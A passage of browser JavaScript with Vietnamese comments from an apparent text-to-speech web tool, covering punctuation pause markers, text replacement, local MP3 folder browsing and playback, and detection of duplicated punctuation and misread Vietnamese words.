                     const regex = new RegExp(escapedFindVal, 'g');
                     currentText = currentText.replace(regex, pair.replace);
                }

                mainTextareaForNewFunc.value = currentText;
                mainTextareaForNewFunc.dispatchEvent(new Event('input', { 'bubbles': true }));
            });

            // Khởi tạo
            loadSettings();
            loadPairs();

            if (pairsContainer.childElementCount === 0) {
                addPairRow();
            }
        }

        // --- 2.5. Chunk Settings Functionality ---
        (function() {
            const CHUNK_SETTINGS_KEY = 'DUC_LOI_CHUNK_SETTINGS_V1';
            const blankLineToggle = document.getElementById('enable-blank-line-chunking');

            if (!blankLineToggle) return;

            // Lưu trạng thái công tắc
            const saveChunkSettings = () => {
                const settings = {
                    enableBlankLineChunking: blankLineToggle.checked
                };
                localStorage.setItem(CHUNK_SETTINGS_KEY, JSON.stringify(settings));
            };

            // Tải trạng thái đã lưu
            const loadChunkSettings = () => {
                try {
                    const savedSettings = localStorage.getItem(CHUNK_SETTINGS_KEY);
                    if (savedSettings) {
                        const settings = JSON.parse(savedSettings);
                        blankLineToggle.checked = settings.enableBlankLineChunking === true; // Mặc định là false
                    } else {
                        blankLineToggle.checked = false; // Mặc định tắt
                    }
                } catch (e) {
                    console.error("Lỗi khi tải cài đặt chunk:", e);
                    blankLineToggle.checked = false; // Mặc định tắt
                }
            };

            // Lưu ngay khi thay đổi, không hiện cảnh báo
            blankLineToggle.addEventListener('change', function() {
                saveChunkSettings();
            });

            // Khởi tạo
            loadChunkSettings();
        })();

        // --- 3. Punctuation Settings Functionality ---
        function initializePunctuationSettings() {
            const modal = document.getElementById('punctuation-settings-modal');
            if (!modal) return;
            const openBtn = document.getElementById('open-punctuation-settings-btn');
            if (!openBtn) return;

            const startQueueBtn = document.getElementById('gemini-start-queue-btn');
            const applyPunctuationBtn = document.getElementById('apply-punctuation-btn');
            const mainTextarea = document.getElementById('gemini-main-textarea');

            // Đơn giản: ẩn nút khi bấm "Tạo âm thanh"
            if (startQueueBtn) {
                startQueueBtn.addEventListener('click', function() {
                    // Ẩn nút ngay khi bấm
                    startQueueBtn.style.display = 'none';
                });
            }
            
            // ⭐ TAB SWITCHING LOGIC
            const tabBtns = modal.querySelectorAll('.settings-tab-btn');
            const tabContents = modal.querySelectorAll('.settings-tab-content');
            
            tabBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    const targetTab = this.getAttribute('data-tab');
                    
                    // Remove active class from all tabs
                    tabBtns.forEach(b => {
                        b.classList.remove('active');
                        b.style.color = '#94a3b8';
                        b.style.borderBottom = '3px solid transparent';
                    });
                    
                    // Add active class to clicked tab
                    this.classList.add('active');
                    this.style.color = '#f8f8f2';
                    this.style.borderBottom = '3px solid #bd93f9';
                    
                    // Hide all tab contents
                    tabContents.forEach(content => {
                        content.style.display = 'none';
                    });
                    
                    // Show target tab content
                    const targetContent = document.getElementById(targetTab);
                    if (targetContent) {
                        targetContent.style.display = 'block';
                    }
                });
            });
            
            const closeBtn = modal.querySelector('.punctuation-modal-close-btn');
            const saveBtn = document.getElementById('save-punctuation-settings-btn');
            const defaultBtn = document.getElementById('default-punctuation-settings-btn');
            const adjustBtns = modal.querySelectorAll('.adjust-btn');

            const inputs = {
                period: modal.querySelector('#pause-period'),
                comma: modal.querySelector('#pause-comma'),
                semicolon: modal.querySelector('#pause-semicolon'),
                newline: modal.querySelector('#pause-newline')
            };

            const toggles = {
                period: modal.querySelector('#toggle-period'),
                comma: modal.querySelector('#toggle-comma'),
                semicolon: modal.querySelector('#toggle-semicolon'),
                newline: modal.querySelector('#toggle-newline')
            };

            const STORAGE_KEY = 'DUC_LOI_PUNCTUATION_SETTINGS_V2';
            const DEFAULTS = {
                period: 0.7,
                comma: 0.3,
                semicolon: 0.5,
                newline: 0.5,
                periodEnabled: false,
                commaEnabled: false,
                semicolonEnabled: false,
                newlineEnabled: false
            };

            // Cải tiến: Đọc trạng thái trực tiếp từ UI thay vì từ localStorage
            const checkPunctuationState = () => {
                // Đọc trạng thái BẬT/TẮT trực tiếp từ các checkbox trên giao diện
                const isAnyToggleActive = (toggles.period.checked && parseFloat(inputs.period.value) > 0) ||
                                          (toggles.comma.checked && parseFloat(inputs.comma.value) > 0) ||
                                          (toggles.semicolon.checked && parseFloat(inputs.semicolon.value) > 0) ||
                                          (toggles.newline.checked && parseFloat(inputs.newline.value) > 0);

                if (isAnyToggleActive) {
                    startQueueBtn.style.display = 'none';
                    applyPunctuationBtn.style.display = 'block';
                } else {
                    // Chỉ hiện nút nếu chưa bị ẩn (chưa bấm tạo âm thanh)
                    // Nhưng không can thiệp nếu nút đã được hiện lại sau khi áp dụng thiết lập
                    if (startQueueBtn.style.display !== 'none') {
                        startQueueBtn.style.display = 'block';
                        startQueueBtn.disabled = mainTextarea.value.trim() === '';
                    }
                    applyPunctuationBtn.style.display = 'none';
                }
            };

            const openModal = () => {
                loadSettings(); // Khi mở modal, tải cài đặt đã lưu để hiển thị
                modal.style.display = 'flex';
            };

            const closeModal = () => {
                modal.style.display = 'none';
                loadSettings(); // Tải lại cài đặt đã lưu để hủy các thay đổi chưa lưu
                checkPunctuationState();
            };

            const getSettingsFromStorage = () => {
                try {
                    const saved = localStorage.getItem(STORAGE_KEY);
                    return saved ? JSON.parse(saved) : DEFAULTS;
                } catch (e) {
                    return DEFAULTS;
                }
            };

            const loadSettings = () => {
                const settings = getSettingsFromStorage();
                Object.keys(settings).forEach(key => {
                    if (key.endsWith('Enabled')) {
                        const baseKey = key.replace('Enabled', '');
                        if (toggles[baseKey]) toggles[baseKey].checked = settings[key];
                    } else {
                        if (inputs[key]) inputs[key].value = (settings[key] || 0).toFixed(1);
                    }
                });
            };

            const saveSettings = (shouldCloseModal = true) => {
                const settingsToSave = {
                    period: parseFloat(inputs.period.value) || 0,
                    comma: parseFloat(inputs.comma.value) || 0,
                    semicolon: parseFloat(inputs.semicolon.value) || 0,
                    newline: parseFloat(inputs.newline.value) || 0,
                    periodEnabled: toggles.period.checked,
                    commaEnabled: toggles.comma.checked,
                    semicolonEnabled: toggles.semicolon.checked,
                    newlineEnabled: toggles.newline.checked
                };
                localStorage.setItem(STORAGE_KEY, JSON.stringify(settingsToSave));

                if (shouldCloseModal) {
                    closeModal();
                    Swal.fire({ toast: true, position: 'top-end', icon: 'success', title: 'Đã lưu cài đặt!', showConfirmButton: false, timer: 1500 });
                }
                checkPunctuationState();
            };

            const applyDefaults = () => {
                Object.keys(DEFAULTS).forEach(key => {
                    if (key.endsWith('Enabled')) {
                        const baseKey = key.replace('Enabled', '');
                        toggles[baseKey].checked = DEFAULTS[key];
                    } else {
                        inputs[key].value = DEFAULTS[key].toFixed(1);
                    }
                });
                saveSettings(false);
            };

            const adjustValue = (e) => {
                const targetId = e.target.dataset.target;
                const step = parseFloat(e.target.dataset.step);
                const input = document.getElementById(targetId);
                if (input) {
                    let currentValue = parseFloat(input.value) || 0;
                    let newValue = Math.max(0, currentValue + step);
                    input.value = newValue.toFixed(1);
                    saveSettings(false);
                }
            };

            applyPunctuationBtn.addEventListener('click', () => {
                const settings = getSettingsFromStorage(); // Lấy cài đặt đã lưu để áp dụng
                let textToProcess = mainTextarea.value;
                const mapDurationToPauseString = (seconds) => `<#${parseFloat(seconds).toFixed(1)}#>`;

                // Loại bỏ hàm pause cũ để tránh trùng lặp
                textToProcess = textToProcess.replace(/<#[0-9.]+#>/g, '');
                // ⭐ FIX: Chỉ replace nhiều spaces, KHÔNG replace xuống dòng
                textToProcess = textToProcess.replace(/ {2,}/g, ' ');

                // Thay thế dấu câu đã thiết lập
                // ⭐ FIX: Chỉ replace dấu chấm/phẩy KHÔNG phải số thập phân (29.5, 1,000)
                if (settings.periodEnabled && settings.period > 0) {
                    // Negative lookbehind/lookahead: Chỉ replace dấu chấm KHÔNG nằm giữa 2 số
                    textToProcess = textToProcess.replace(/(?<!\d)\.(?!\d)/g, ` ${mapDurationToPauseString(settings.period)} `);
                }
                if (settings.commaEnabled && settings.comma > 0) {
                    // Negative lookbehind/lookahead: Chỉ replace dấu phẩy KHÔNG nằm giữa 2 số (để tránh 1,000 → 1 (#0.3#) 000)
                    textToProcess = textToProcess.replace(/(?<!\d),(?!\d)/g, ` ${mapDurationToPauseString(settings.comma)} `);
                }
                if (settings.semicolonEnabled && settings.semicolon > 0) textToProcess = textToProcess.replace(/;/g, ` ${mapDurationToPauseString(settings.semicolon)} `);
                if (settings.newlineEnabled && settings.newline > 0) textToProcess = textToProcess.replace(/\n/g, ` ${mapDurationToPauseString(settings.newline)} `);
                // ⭐ FIX: Chỉ replace nhiều spaces, KHÔNG replace xuống dòng
                textToProcess = textToProcess.replace(/ {2,}/g, ' ');
                mainTextarea.value = textToProcess;
                mainTextarea.dispatchEvent(new Event('input', { bubbles: true }));

                // Cải tiến: Tắt tạm thời các toggle trên UI
                Object.values(toggles).forEach(toggle => toggle.checked = false);

                // BỎ ĐI LỆNH LƯU, để không ghi đè cài đặt gốc của người dùng
                // saveSettings(false); // <--- DÒNG NÀY ĐÃ ĐƯỢC XÓA

                // Hiện lại nút tạo âm thanh sau khi áp dụng thiết lập
                startQueueBtn.style.display = 'block';
                startQueueBtn.disabled = mainTextarea.value.trim() === '';
                applyPunctuationBtn.style.display = 'none';

                Swal.fire({ toast: true, position: 'top-end', icon: 'success', title: 'Đã áp dụng thiết lập vào văn bản!', showConfirmButton: false, timer: 2000 });
            });

            // Gắn các sự kiện
            openBtn.addEventListener('click', openModal);
            closeBtn.addEventListener('click', closeModal);
            modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
            saveBtn.addEventListener('click', () => saveSettings(true));
            defaultBtn.addEventListener('click', applyDefaults);
            adjustBtns.forEach(btn => btn.addEventListener('click', adjustValue));

            // Khi người dùng thay đổi bất cứ gì trong modal, sẽ tự động lưu lại
            modal.addEventListener('change', () => saveSettings(false));
            modal.addEventListener('input', () => saveSettings(false));

            // Khởi tạo
            loadSettings();
            checkPunctuationState();
        }

        // Gọi hàm thiết lập dấu câu sau khi các element khác đã sẵn sàng
        initializePunctuationSettings();

        // --- 4. Audio Folder Manager Functionality ---
        (function() {
            const folderSelectBtn = document.getElementById('folder-select-btn');
            const selectedFolderPath = document.getElementById('selected-folder-path');
            const audioListContainer = document.getElementById('audio-list-container');
            const refreshBtn = document.getElementById('refresh-audio-list-btn');
            let selectedFolderHandle = null;
            let currentAudio = null;

            // Storage keys
            const STORAGE_KEYS = {
                FOLDER_NAME: 'DUC_LOI_AUDIO_FOLDER_NAME_V1',
                FOLDER_PATH: 'DUC_LOI_AUDIO_FOLDER_PATH_V1',
                FILE_LIST: 'DUC_LOI_AUDIO_FILE_LIST_V1',
                LAST_ACCESS: 'DUC_LOI_LAST_ACCESS_V1'
            };

            // Function to save folder info
            function saveFolderInfo(folderName, folderPath) {
                try {
                    localStorage.setItem(STORAGE_KEYS.FOLDER_NAME, folderName);
                    localStorage.setItem(STORAGE_KEYS.FOLDER_PATH, folderPath);
                    localStorage.setItem(STORAGE_KEYS.LAST_ACCESS, Date.now().toString());
                    console.log('Đã lưu thông tin thư mục:', folderName);
                } catch (error) {
                    console.error('Error saving folder info:', error);
                }
            }

            // Function to save file list
            function saveFileList(files) {
                try {
                    const fileListData = files.map(file => ({
                        name: file.name,
                        size: file.size,
                        lastModified: file.lastModified,
                        type: file.type
                    }));
                    localStorage.setItem(STORAGE_KEYS.FILE_LIST, JSON.stringify(fileListData));
                } catch (error) {
                    console.error('Error saving file list:', error);
                }
            }

            // Function to load saved data
            function loadSavedData() {
                try {
                    const savedFolderName = localStorage.getItem(STORAGE_KEYS.FOLDER_NAME);
                    const savedFolderPath = localStorage.getItem(STORAGE_KEYS.FOLDER_PATH);
                    const savedFileList = localStorage.getItem(STORAGE_KEYS.FILE_LIST);

                    if (savedFolderName && savedFolderPath) {
                        // Restore folder info display
                        selectedFolderPath.textContent = `📁 ${savedFolderName} (Đã lưu - Click để chọn lại)`;
                        selectedFolderPath.style.display = 'block';
                        audioListContainer.style.display = 'block';
                        refreshBtn.style.display = 'block';

                        // Show saved file list if available
                        if (savedFileList) {
                            try {
                                const fileListData = JSON.parse(savedFileList);
                                displaySavedFileList(fileListData);
                            } catch (error) {
                                console.error('Error parsing saved file list:', error);
                            }
                        }

                        return { folderName: savedFolderName, folderPath: savedFolderPath };
                    }
                } catch (error) {
                    console.error('Error loading saved data:', error);
                }
                return null;
            }

            // Function to display saved file list
            function displaySavedFileList(fileListData) {
                audioListContainer.innerHTML = '';

                if (fileListData.length === 0) {
                    audioListContainer.innerHTML = '<div style="padding: 10px; text-align: center; color: #94a3b8;">Không có file MP3 nào</div>';
                    return;
                }

                fileListData.forEach((fileData, index) => {
                    const item = document.createElement('div');
                    item.className = 'audio-item';
                    item.dataset.index = index;

                    const name = document.createElement('div');
                    name.className = 'audio-name';
                    name.textContent = fileData.name;

                    const duration = document.createElement('div');
                    duration.className = 'audio-duration';
                    duration.textContent = '--:--';

                    const playBtn = document.createElement('button');
                    playBtn.className = 'play-btn';
                    playBtn.textContent = '▶';
                    playBtn.title = 'Phát âm thanh';
                    playBtn.disabled = true; // Disabled for saved files

                    const uploadBtn = document.createElement('button');
                    uploadBtn.className = 'play-btn';
                    uploadBtn.textContent = '📤';
                    uploadBtn.title = 'Tải file lên';
                    uploadBtn.style.marginLeft = '5px';
                    uploadBtn.disabled = true; // Disabled for saved files

                    const statusText = document.createElement('div');
                    statusText.className = 'audio-duration';
                    statusText.textContent = 'Đã lưu';
                    statusText.style.color = '#50fa7b';
                    statusText.style.fontSize = '10px';

                    item.appendChild(name);
                    item.appendChild(duration);
                    item.appendChild(playBtn);
                    item.appendChild(uploadBtn);
                    item.appendChild(statusText);

                    audioListContainer.appendChild(item);
                });

                // Show info message
                const infoDiv = document.createElement('div');
                infoDiv.style.cssText = 'padding: 8px; text-align: center; color: #8be9fd; font-size: 12px; background: #44475a; border-radius: 4px; margin-bottom: 10px;';
                infoDiv.innerHTML = '📁 <strong>Dữ liệu đã lưu tự động</strong><br/>💡 Tool sẽ nhớ thư mục này khi bạn tắt/khởi động lại<br/>🔄 Click vào tên thư mục để chọn lại';
                audioListContainer.insertBefore(infoDiv, audioListContainer.firstChild);
            }

            // Function to format duration
            function formatDuration(seconds) {
                const mins = Math.floor(seconds / 60);
                const secs = Math.floor(seconds % 60);
                return `${mins}:${secs.toString().padStart(2, '0')}`;
            }

            // Function to get audio duration
            function getAudioDuration(file) {
                return new Promise((resolve) => {
                    const audio = new Audio();
                    audio.addEventListener('loadedmetadata', () => {
                        resolve(audio.duration);
                    });
                    audio.addEventListener('error', () => {
                        resolve(0);
                    });
                    audio.src = URL.createObjectURL(file);
                });
            }

            // Function to create audio item
            function createAudioItem(file, index) {
                const item = document.createElement('div');
                item.className = 'audio-item';
                item.dataset.index = index;

                const name = document.createElement('div');
                name.className = 'audio-name';
                name.textContent = file.name;

                const duration = document.createElement('div');
                duration.className = 'audio-duration';
                duration.textContent = '--:--';

                const playBtn = document.createElement('button');
                playBtn.className = 'play-btn';
                playBtn.textContent = '▶';
                playBtn.title = 'Phát âm thanh';

                const uploadBtn = document.createElement('button');
                uploadBtn.className = 'play-btn';
                uploadBtn.textContent = '📤';
                uploadBtn.title = 'Tải file lên';
                uploadBtn.style.marginLeft = '5px';

                item.appendChild(name);
                item.appendChild(duration);
                item.appendChild(playBtn);
                item.appendChild(uploadBtn);

                // Get duration
                getAudioDuration(file).then(dur => {
                    duration.textContent = formatDuration(dur);
                });

                // Play/pause functionality
                playBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    if (currentAudio && currentAudio.paused === false) {
                        currentAudio.pause();
                        document.querySelectorAll('.audio-item.playing').forEach(el => {
                            el.classList.remove('playing');
                            el.querySelector('.play-btn').textContent = '▶';
                        });
                        return;
                    }

                    // Stop current audio
                    if (currentAudio) {
                        currentAudio.pause();
                        currentAudio = null;
                    }

                    // Play new audio
                    const audio = new Audio(URL.createObjectURL(file));
                    currentAudio = audio;

                    document.querySelectorAll('.audio-item.playing').forEach(el => {
                        el.classList.remove('playing');
                        el.querySelector('.play-btn').textContent = '▶';
                    });

                    item.classList.add('playing');
                    playBtn.textContent = '⏸';

                    audio.addEventListener('ended', () => {
                        item.classList.remove('playing');
                        playBtn.textContent = '▶';
                        currentAudio = null;
                    });

                    audio.addEventListener('pause', () => {
                        item.classList.remove('playing');
                        playBtn.textContent = '▶';
                    });

                    audio.play().catch(console.error);
                });

                // Upload button functionality
                uploadBtn.addEventListener('click', (e) => {
                    e.stopPropagation();

                    // Auto-upload the selected file
                    try {
                        const fileInput = document.getElementById('gemini-file-input');
                        if (fileInput) {
                            // Create a new FileList with the selected file
                            const dataTransfer = new DataTransfer();
                            dataTransfer.items.add(file);
                            fileInput.files = dataTransfer.files;

                            // Trigger the change event to simulate file selection
                            fileInput.dispatchEvent(new Event('change', { bubbles: true }));

                            // Show success message
                            Swal.fire({
                                toast: true,
                                position: 'top-end',
                                icon: 'success',
                                title: 'Đã tải file âm thanh',
                                text: `File "${file.name}" đã được tải lên thành công!`,
                                showConfirmButton: false,
                                timer: 2000,
                                timerProgressBar: true,
                            });
                        }
                    } catch (error) {
                        console.error('Error auto-uploading file:', error);
                        Swal.fire({
                            toast: true,
                            position: 'top-end',
                            icon: 'error',
                            title: 'Lỗi tải file',
                            text: 'Không thể tự động tải file. Vui lòng thử lại.',
                            showConfirmButton: false,
                            timer: 2000,
                            timerProgressBar: true,
                        });
                    }
                });

                // Click to play only
                item.addEventListener('click', () => {
                    playBtn.click();
                });

                return item;
            }

            // Function to update audio list
            async function updateAudioList() {
                if (!selectedFolderHandle) return;

                try {
                    const files = [];
                    for await (const [name, handle] of selectedFolderHandle.entries()) {
                        if (handle.kind === 'file' && name.toLowerCase().endsWith('.mp3')) {
                            const file = await handle.getFile();
                            files.push(file);
                        }
                    }

                    // Save file list to localStorage
                    saveFileList(files);

                    audioListContainer.innerHTML = '';

                    if (files.length === 0) {
                        audioListContainer.innerHTML = '<div style="padding: 10px; text-align: center; color: #94a3b8;">Không tìm thấy file MP3 nào</div>';
                    } else {
                        files.forEach((file, index) => {
                            const item = createAudioItem(file, index);
                            audioListContainer.appendChild(item);
                        });
                    }
                } catch (error) {
                    console.error('Error reading folder:', error);
                    audioListContainer.innerHTML = '<div style="padding: 10px; text-align: center; color: #f87171;">Lỗi khi đọc thư mục</div>';
                }
            }

            // Folder selection
            if (folderSelectBtn) {
                folderSelectBtn.addEventListener('click', async () => {
                    try {
                        // Check if File System Access API is supported
                        if ('showDirectoryPicker' in window) {
                            selectedFolderHandle = await window.showDirectoryPicker();
                            selectedFolderPath.textContent = `📁 ${selectedFolderHandle.name}`;
                            selectedFolderPath.style.display = 'block';
                            audioListContainer.style.display = 'block';
                            refreshBtn.style.display = 'block';

                            // Save folder info to localStorage
                            saveFolderInfo(selectedFolderHandle.name, selectedFolderHandle.name);

                            await updateAudioList();

                            // Show success message
                            Swal.fire({
                                toast: true,
                                position: 'top-end',
                                icon: 'success',
                                title: 'Đã chọn thư mục',
                                text: `Thư mục "${selectedFolderHandle.name}" đã được chọn và lưu tự động`,
                                showConfirmButton: false,
                                timer: 2000,
                                timerProgressBar: true,
                            });

                            // Auto-refresh every 5 seconds
                            setInterval(updateAudioList, 5000);
                        } else {
                            // Fallback for browsers that don't support File System Access API
                            Swal.fire({
                                icon: 'warning',
                                title: 'Trình duyệt không hỗ trợ',
                                text: 'Trình duyệt của bạn không hỗ trợ tính năng chọn thư mục. Vui lòng sử dụng Chrome, Edge hoặc Opera mới nhất.',
                                confirmButtonText: 'OK'
                            });
                        }
                    } catch (error) {
                        if (error.name !== 'AbortError') {
                            console.error('Error selecting folder:', error);
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi',
                                text: 'Không thể chọn thư mục. Vui lòng thử lại.',
                                confirmButtonText: 'OK'
                            });
                        }
                    }
                });
            }

            // Refresh button
            if (refreshBtn) {
                refreshBtn.addEventListener('click', updateAudioList);
            }

            // Add connect to saved folder button
            const connectSavedBtn = document.createElement('button');
            connectSavedBtn.id = 'connect-saved-folder-btn';
            connectSavedBtn.textContent = '🔗 Kết nối thư mục đã lưu';
            connectSavedBtn.style.cssText = 'background-color:#50fa7b;color:#282a36;padding:8px 12px;border:none;border-radius:4px;cursor:pointer;font-size:12px;margin-top:5px;width:100%;font-weight:bold';
            connectSavedBtn.title = 'Kết nối đến thư mục đã lưu trước đó';
            connectSavedBtn.style.display = 'none'; // Hidden by default

            // Add click handler for connect button
            connectSavedBtn.addEventListener('click', async () => {
                if (!('showDirectoryPicker' in window)) {
                    Swal.fire({
                        icon: 'warning',
                        title: 'Trình duyệt không hỗ trợ',
                        text: 'Trình duyệt của bạn không hỗ trợ tính năng chọn thư mục. Vui lòng sử dụng Chrome, Edge hoặc Opera mới nhất.',
                        confirmButtonText: 'OK'
                    });
                    return;
                }

                try {
                    // Show loading
                    Swal.fire({
                        title: 'Đang kết nối...',
                        text: 'Vui lòng chọn thư mục trong cửa sổ mới mở',
                        icon: 'info',
                        allowOutsideClick: false,
                        showConfirmButton: false,
                        timer: 10000,
                        timerProgressBar: true
                    });

                    // Open directory picker
                    selectedFolderHandle = await window.showDirectoryPicker();

                    // Update display
                    selectedFolderPath.textContent = `📁 ${selectedFolderHandle.name}`;

                    // Save folder info
                    saveFolderInfo(selectedFolderHandle.name, selectedFolderHandle.name);

                    // Update audio list
                    await updateAudioList();

                    // Show success
                    Swal.fire({
                        toast: true,
                        position: 'top-end',
                        icon: 'success',
                        title: '✅ Đã kết nối thành công!',
                        text: `Thư mục "${selectedFolderHandle.name}" đã sẵn sàng sử dụng`,
                        showConfirmButton: false,
                        timer: 3000,
                        timerProgressBar: true,
                    });

                } catch (error) {
                    if (error.name !== 'AbortError') {
                        console.error('Error connecting to folder:', error);
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi kết nối',
                            text: 'Không thể kết nối đến thư mục. Vui lòng thử lại.',
                            confirmButtonText: 'OK'
                        });
                    } else {
                        // User cancelled
                        Swal.fire({
                            toast: true,
                            position: 'top-end',
                            icon: 'info',
                            title: 'Đã hủy',
                            text: 'Bạn có thể click nút "Kết nối thư mục đã lưu" để thử lại',
                            showConfirmButton: false,
                            timer: 2000,
                            timerProgressBar: true,
                        });
                    }
                }
            });

            // Insert connect button after refresh button
            if (refreshBtn && refreshBtn.parentNode) {
                refreshBtn.parentNode.insertBefore(connectSavedBtn, refreshBtn.nextSibling);
            }

            // Add click handler to restore folder from saved data
            if (selectedFolderPath) {
                selectedFolderPath.addEventListener('click', async () => {
                    if (!('showDirectoryPicker' in window)) {
                        Swal.fire({
                            icon: 'warning',
                            title: 'Trình duyệt không hỗ trợ',
                            text: 'Trình duyệt của bạn không hỗ trợ tính năng chọn thư mục. Vui lòng sử dụng Chrome, Edge hoặc Opera mới nhất.',
                            confirmButtonText: 'OK'
                        });
                        return;
                    }

                    try {
                        // Show loading message
                        Swal.fire({
                            title: 'Đang mở thư mục...',
                            text: 'Vui lòng chọn thư mục trong cửa sổ mới mở',
                            icon: 'info',
                            allowOutsideClick: false,
                            showConfirmButton: false,
                            timer: 5000,
                            timerProgressBar: true
                        });

                        // Open directory picker
                        selectedFolderHandle = await window.showDirectoryPicker();

                        // Update display
                        selectedFolderPath.textContent = `📁 ${selectedFolderHandle.name}`;

                        // Save new folder info
                        saveFolderInfo(selectedFolderHandle.name, selectedFolderHandle.name);

                        // Update audio list
                        await updateAudioList();

                        // Show success message
                        Swal.fire({
                            toast: true,
                            position: 'top-end',
                            icon: 'success',
                            title: '✅ Đã khôi phục thư mục!',
                            text: `Thư mục "${selectedFolderHandle.name}" đã sẵn sàng sử dụng`,
                            showConfirmButton: false,
                            timer: 3000,
                            timerProgressBar: true,
                        });

                    } catch (error) {
                        if (error.name !== 'AbortError') {
                            console.error('Error selecting folder:', error);
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi chọn thư mục',
                                text: 'Không thể chọn thư mục. Vui lòng thử lại.',
                                confirmButtonText: 'OK'
                            });
                        } else {
                            // User cancelled, show info
                            Swal.fire({
                                toast: true,
                                position: 'top-end',
                                icon: 'info',
                                title: 'Đã hủy',
                                text: 'Bạn có thể click vào tên thư mục để chọn lại bất cứ lúc nào',
                                showConfirmButton: false,
                                timer: 2000,
                                timerProgressBar: true,
                            });
                        }
                    }
                });

                // Add cursor pointer style and hover effect
                selectedFolderPath.style.cursor = 'pointer';
                selectedFolderPath.style.transition = 'all 0.2s ease';
                selectedFolderPath.title = 'Click để chọn lại thư mục và khôi phục quyền truy cập';

                // Add hover effect
                selectedFolderPath.addEventListener('mouseenter', () => {
                    selectedFolderPath.style.backgroundColor = '#44475a';
                    selectedFolderPath.style.borderRadius = '4px';
                    selectedFolderPath.style.padding = '4px 8px';
                });

                selectedFolderPath.addEventListener('mouseleave', () => {
                    selectedFolderPath.style.backgroundColor = 'transparent';
                    selectedFolderPath.style.borderRadius = '0';
                    selectedFolderPath.style.padding = '0';
                });
            }

            // Load saved data on page load
            const savedData = loadSavedData();
            if (savedData) {
                connectSavedBtn.style.display = 'block';
                console.log('Restored saved folder:', savedData.folderName);
            }
        })();

        // --- 5. Punctuation Detection Functionality ---
        (function() {
            let punctuationDetectionEnabled = true;
            let detectedPunctuationIssues = [];

            // Hàm phát hiện dấu câu trùng lặp
            // Hàm phát hiện các từ Tiếng Việt cần sửa (ai, im)
            function detectVietnameseWordIssues(text) {
                // Chỉ detect khi language = Tiếng Việt
                const languageSelect = document.getElementById('gemini-language-select');
                if (!languageSelect) return [];
                
                const selectedLanguage = languageSelect.value.toLowerCase();
                
                // Check nếu KHÔNG phải Tiếng Việt → không detect
                if (!selectedLanguage.includes('việt') && !selectedLanguage.includes('viet') && !selectedLanguage.includes('vietnamese')) {
                    return [];
                }
                
                const issues = [];
                
                // Detect "ai" (word boundary)
                const aiPattern = /\bai\b/gi;
                let match;
                
                while ((match = aiPattern.exec(text)) !== null) {
                    // Chỉ báo lỗi nếu là chữ thường "ai" (không phải "Ai" hoặc "AI")
                    if (match[0] === 'ai') {
                        issues.push({
                            text: match[0],
                            start: match.index,
                            end: match.index + match[0].length,
                            type: '⚠️ Từ Tiếng Việt hay bị đọc sai',
                            suggestion: 'Ai',
                            isVietnameseWord: true
                        });
                    }
                }
                
                // Detect "im" (word boundary)
                const imPattern = /\bim\b/gi;
                
                while ((match = imPattern.exec(text)) !== null) {
                    // Chỉ báo lỗi nếu là chữ thường "im" (không phải "Im" hoặc "IM")
                    if (match[0] === 'im') {
                        issues.push({
                            text: match[0],
                            start: match.index,
                            end: match.index + match[0].length,
                            type: '⚠️ Từ Tiếng Việt hay bị đọc sai',
                            suggestion: 'Im',
                            isVietnameseWord: true
                        });
                    }
                }
                
                return issues;
            }

            function detectPunctuationIssues(text) {
                if (!punctuationDetectionEnabled || !text) return [];

                const issues = [];

                // Pattern tổng quát để phát hiện tất cả cụm dấu câu (2 ký tự trở lên)
                // Dấu ngoặc kép chỉ bị phát hiện khi nằm cùng với dấu câu khác
                const generalPattern = /[.!?,;:]{2,}|[.!?,;:]["']|["'][.!?,;:]|["'][.!?,;:]{2,}|[.!?,;:]{2,}["']/g;

                let match;
                while ((match = generalPattern.exec(text)) !== null) {
                    const matchedText = match[0];
                    const start = match.index;
                    const end = match.index + matchedText.length;

                    // Phân loại loại lỗi
                    let type = 'Dấu câu trùng lặp';
                    if (/[.!?]{2,}/.test(matchedText)) {
                        type = 'Dấu chấm/chấm hỏi/chấm than trùng lặp';
                    } else if (/[,;]{2,}/.test(matchedText)) {
                        type = 'Dấu phẩy/chấm phẩy trùng lặp';
                    } else if (/[:]{2,}/.test(matchedText)) {
                        type = 'Dấu hai chấm trùng lặp';
                    } else if (/["'][.!?,;:]|[.!?,;:]["']/.test(matchedText)) {
                        type = 'Dấu ngoặc kép kết hợp với dấu câu khác';
                    } else if (/[.!?][,;:]|[;:,][.!?]/.test(matchedText)) {
                        type = 'Dấu câu kết hợp khác nhau';
                    }

                    issues.push({
                        text: matchedText,
                        start: start,
                        end: end,
                        type: type,
                        suggestion: getPunctuationSuggestion(matchedText)
                    });
                }

                // ⭐ THÊM MỚI: Merge Vietnamese word issues
                const vietnameseIssues = detectVietnameseWordIssues(text);
                issues.push(...vietnameseIssues);

                return issues;
            }

            // Hàm đề xuất dấu câu thay thế
            function getPunctuationSuggestion(originalText) {
                // Nếu có dấu chấm hỏi, ưu tiên giữ dấu chấm hỏi
                if (originalText.includes('?')) return '?';
                // Nếu có dấu chấm than, ưu tiên giữ dấu chấm than
                if (originalText.includes('!')) return '!';
                // Nếu có dấu chấm, ưu tiên giữ dấu chấm
                if (originalText.includes('.')) return '.';
                // Nếu có dấu phẩy, ưu tiên giữ dấu phẩy
                if (originalText.includes(',')) return ',';
                // Nếu có dấu ngoặc kép, ưu tiên giữ dấu ngoặc kép
                if (originalText.includes('"')) return '"';
                // Nếu có dấu ngoặc đơn, ưu tiên giữ dấu ngoặc đơn
                if (originalText.includes("'")) return "'";
                // Mặc định là dấu chấm
                return '.';
            }

            // Hàm hiển thị danh sách lỗi dấu câu
            function displayPunctuationIssues(issues) {
                const modal = document.getElementById('punctuation-detection-modal');
                const issuesList = document.getElementById('punctuation-issues-list');

                if (!issues || issues.length === 0) {
                    modal.style.display = 'none';
                    return;
                }

                issuesList.innerHTML = '';
                issues.forEach((issue, index) => {
                    const issueDiv = document.createElement('div');
                    issueDiv.style.cssText = `
                        background: #44475a;
                        border: 1px solid #6272a4;
                        border-radius: 6px;
                        padding: 12px;
                        margin-bottom: 10px;
                        font-size: 14px;
                    `;

                    issueDiv.className = 'punctuation-issue-item';
                    issueDiv.innerHTML = `
                        <div style="color: #ffb86c; font-weight: bold; margin-bottom: 6px; font-size: 15px;">
                            ${issue.type}
